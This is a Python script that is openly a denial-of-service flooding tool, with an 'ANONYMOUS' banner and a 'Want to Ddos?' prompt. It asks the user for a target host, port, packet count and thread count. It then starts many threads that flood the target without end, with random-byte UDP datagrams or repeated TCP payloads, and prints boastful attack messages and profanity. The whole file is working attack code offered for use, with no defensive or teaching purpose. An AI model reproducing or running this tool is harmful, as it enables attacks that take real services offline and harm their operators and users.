import random
import socket
import threading
import time
import os,sys

#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
##############
os.system("clear")
print("""\033[93m
              ANONYMOUS
      ╭━━━╮     ╭╮ ╭━━━╮
      ┃╭━━╯     ┃┃ ╰╮╭╮┃
      ┃╰━━┳╮╭┳━━┫┃╭╮┃┃┃┣━━┳━━╮
      ┃╭━━┫┃┃┃╭━┫╰╯╯┃┃┃┃╭╮┃━━┫
      ┃┃  ┃╰╯┃╰━┫╭╮┳╯╰╯┃╰╯┣━━┃v2.3
      ╰╯  ╰━━┻━━┻╯╰┻━━━┻━━┻━━╯
          Разнеси всех и вся 💥
""")
time.sleep(3)

os.system("clear")
print("""
\033[31m██████░░░██░░░██░░███████░░░░█████░
\033[32m░░░░██░░░██░░░██░░░░███░░░░██░░░░░██
\033[33m░░██░░░░░██░░░██░░░░███░░░░██░░░░░██
\033[34m██░░░░░░░██░░░██░░░░███░░░░██░░░░░██
\033[35m██████░░░██████░░░░░███░░░░░░█████░
""")
print ()
print("\033[33m━━━ Want to Ddos? (y/n)")
choice = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[33m━━━ Host/IP")
ip = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[33m━━━ Port")
port = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[33m━━━ Pakets")	
times = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[33m━━━ Threads")
threads = int(input("┗━━━━━━>\033[0m:"))
def run1():
  data = random._urandom(10024)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[Zuto] Server Down KONTOL!!!")

def run2():
  data = random._urandom(800)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[Zuto] Server Down KONTOL!!!")

def run3():
  data = random._urandom(550)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[Zuto] Server Down KONTOL!!!")

def run4():
  data = random._urandom(400)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[Zuto] Server Down KONTOL!!!")

def run5():
  data = random._urandom(320)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[Zuto] Server Down KONTOL!!!")

def run6():
  data = random._urandom(250)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[Zuto] Server Down KONTOL!!!")

def run7():
  data = random._urandom(195)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[Zuto] Server Down KONTOL!!!")

def run8():
  data = random._urandom(160)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[Zuto] Server Down KONTOL!!!")

def run9():
  data = random._urandom(140)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[Zuto] Server Down KONTOL!!!")

def run10():
  data = random._urandom(110)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[Zuto] Server Down KONTOL!!!")

def run11():
  data = random._urandom(100)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[Zuto] Server Down KONTOL!!!")

def run12():
  data = random._urandom(16)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[Zuto] Server Down KONTOL!!!")

def run13():
  data = random._urandom(16)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[Zuto] Server Down KONTOL!!!")

def run14():
  data = random._urandom(16)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[Zuto] Server Down KONTOL!!!")

def run15():
  data = random._urandom(16)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[92m}=====> UDP BYPASSED \033[33mATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[Zuto] Server Down KONTOL!!!")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run1)
    th.start()
    th = threading.Thread(target = run2)
    th.start()
    th = threading.Thread(target = run3)
    th.start()
    th = threading.Thread(target = run4)
    th.start()
    th = threading.Thread(target = run5)
    th.start()
    th = threading.Thread(target = run6)
    th.start()
    th = threading.Thread(target = run7)
    th.start()
    th = threading.Thread(target = run8)
    th.start()
  else:
    th = threading.Thread(target = run9)
    th.start()
    th = threading.Thread(target = run10)
    th.start()
    th = threading.Thread(target = run11)
    th.start()
    th = threading.Thread(target = run12)
    th.start()
    th = threading.Thread(target = run13)
    th.start()
    th = threading.Thread(target = run14)
    th.start()
    th = threading.Thread(target = run15)
    th.start()
